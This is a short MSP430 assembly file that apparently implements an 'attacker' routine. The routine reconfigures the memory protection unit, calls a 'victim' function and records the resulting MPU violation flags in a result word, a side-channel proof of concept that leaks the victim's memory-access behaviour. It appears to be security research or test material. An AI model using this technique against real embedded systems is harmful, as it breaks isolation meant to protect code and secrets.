	.global victim
	.global result
	.global MPUSAM
	.global MPUCTL0
	.global MPUCTL1
	.global attacker

	.sect ".att_ram_code"
result:
	.word 0
attacker:
	mov #6, r13
	mov #1, r12
loop:
	decd sp
	mov #cont, 0(sp)
	clr &MPUCTL1
	mov #0x0555, &MPUSAM
	mov #0xA501, &MPUCTL0
	br #victim
cont:
	mov #0xA500, &MPUCTL0
	bit #1, &MPUCTL1
	rrc &result
	dec r13
	tst r13
	jz end
	bit #2, &MPUCTL1
	rrc &result
	bit #4, &MPUCTL1
	rrc &result
	jmp loop
end:
	reta
